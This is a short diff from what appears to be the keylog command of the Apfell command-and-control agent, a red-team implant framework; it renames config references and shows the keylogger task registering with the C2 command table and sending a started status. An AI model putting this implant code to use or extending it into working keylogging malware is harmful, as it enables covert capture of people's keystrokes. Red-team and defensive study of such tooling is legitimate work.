@@ -11,7 +11,7 @@ keylog = function(params){
             sendError(taskid, tasktype);
         } else {
             const started = btoa(unescape(encodeURIComponent(JSON.stringify({'status': 'started'}))));
-            const apfellmsg = CreateApfellMessage(2, config.apfellID, config.UUID, started.length, taskid, tasktype, started);
+            const apfellmsg = CreateApfellMessage(2, apfell.apfellID, apfell.UUID, started.length, taskid, tasktype, started);
             let meta = {};
             meta["metatype"] = 3;
             meta["metadata"] = apfellmsg;
@@ -22,4 +22,4 @@ keylog = function(params){
 };
 
 C2.commands[keylog.name] = keylog;
-
+COMMAND_ENDS_HERE
